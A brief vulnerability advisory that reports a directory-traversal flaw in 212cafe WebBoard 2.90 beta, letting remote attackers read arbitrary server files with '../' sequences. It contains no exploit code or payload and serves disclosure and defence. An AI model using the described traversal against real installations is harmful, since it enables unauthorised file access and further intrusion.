212cafe WebBoard is prone to a directory-traversal vulnerability because it fails to sufficiently sanitize user-supplied input.

Remote attackers can use a specially crafted request with directory-traversal sequences ('../') to retrieve and read arbitrary files in the context of the webserver. Information harvested may aid in launching further attacks.

212cafe WebBoard 2.90 beta is vulnerable; other versions may also be affected.
